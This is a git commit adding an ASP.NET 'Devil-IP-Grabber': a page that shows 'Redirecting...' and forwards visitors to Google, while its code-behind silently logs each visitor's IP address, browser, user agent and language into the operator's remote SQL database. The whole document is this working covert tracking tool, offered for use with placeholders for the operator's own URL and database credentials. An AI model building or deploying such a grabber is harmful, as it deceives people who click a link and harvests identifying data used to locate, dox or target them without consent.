ad4e1542e58b9e43ae843dfbe67cbab83c3f549b
sècleGhost <73766623+secleGhost@users.noreply.github.com>
2021-05-11 18:05:32 -0500

    Add files via upload

---
+++ Devil-IP-Grabber/Default.aspx
@@ -0,0 +1,33 @@
+﻿<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" %>
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head runat="server">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <form id="form1" runat="server">
+        <div>
+        </div>
+        
+        <p>
+            &nbsp;</p>
+        <p>
+            &nbsp;</p>
+        <p>
+            &nbsp;</p>
+        <p>
+            &nbsp;</p>
+        <p>
+           <center><asp:Label ID="Label1" runat="server" Text="Redirecting..."></asp:Label></center> 
+        </p>
+    </form>
+    <script> 
+<!-- Change the URL to yours//-->
+window.location.replace('http://www.google.com'); 
+
+    </script>
+</body>
+</html>
---
+++ Devil-IP-Grabber/Default.aspx.cs
@@ -0,0 +1,45 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Web;
+using System.Web.UI;
+using System.Web.UI.WebControls;
+using System.Data.Sql;
+using System.Data.SqlClient;
+using System.Data.SqlTypes;
+using System.Data.OleDb;
+public partial class _Default : System.Web.UI.Page
+{
+    public string Ip;
+    public string User;
+    public string Agent;
+    public string[] Use;
+    public string language;
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        Ip = Request.UserHostAddress;
+        User = Request.Browser.ToString();
+        Agent = Request.UserAgent;
+        Use = Request.UserLanguages;
+        foreach(string a in Use)
+        {
+            language = a;
+        }
+        SqlConnection sql;
+        string conexion;
+        //change your connection method for yours example @"Data Source=www.yoursql.com;Initial Catalog=db_database_yourdatabase;User Id=db_your_user_admin;Password=YOUR_PASSWORD"
+        conexion = @"Data Source=www.yoursql.com;Initial Catalog=db_database_yourdatabase;User Id=db_your_user_admin;Password=YOUR_PASSWORD";
+        sql = new SqlConnection(conexion);
+        sql.Open();
+        //add the name of your columns add the name of your columns from your database
+        SqlCommand sqlCommand = new SqlCommand("INSERT INTO [base](ip,browser,agent,language) values(@IP,@BROWSER,@AGENT,@LANGUAGE)", sql);//here
+        sqlCommand.Parameters.AddWithValue("@IP", Ip);
+        sqlCommand.Parameters.AddWithValue("@BROWSER", User);
+        sqlCommand.Parameters.AddWithValue("@AGENT", Agent);
+        sqlCommand.Parameters.AddWithValue("@LANGUAGE", language);
+        sqlCommand.ExecuteNonQuery();
+        sql.Close();
+
+
+    }
+}
